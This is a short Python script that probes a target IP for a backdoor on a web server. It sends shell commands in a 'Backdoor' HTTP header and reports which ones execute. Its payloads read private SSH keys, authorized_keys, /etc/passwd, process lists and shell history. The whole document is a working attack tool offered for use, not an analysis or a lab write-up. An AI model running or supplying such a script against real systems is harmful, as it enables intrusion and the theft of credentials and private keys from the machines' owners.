import re
import requests
import sys
from colorama import Fore
import ipaddress


def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def request(Lhost):
    payloads = [
        "ls -al ",
        "who",
        "whoami",
        "id",
        "id_rsa",
        "cat $HOME/.ssh/id_rsa",
        "cat $HOME/.ssh/authorized_keys",
        "pwd",
        "df -h",
        "ps aux",
        "cat /etc/passwd",
        "cat /etc/group",
        "date",
        "history"
    ]
    url = f"http://{Lhost}"
    patterns = ["home", "data", "bash", "id_rsa", "@", "/bin/bash"]
    
    for payload in payloads:
        header = {"Backdoor": payload}
        r = requests.get(url, headers=header)
        pattern = '|'.join(map(re.escape, patterns))
        matches = re.findall(pattern, r.text)
        
        if matches:
            print(Fore.GREEN + f"Payload Works: {payload} : {matches}")
        
        

if len(sys.argv)!=2:
        print("Usage ./script.py TargetIp")
        sys.exit(1)
else:
     if is_valid_ip(sys.argv[1]):
        request(sys.argv[1])
     else:
         print("INVALID IP ")
        
        
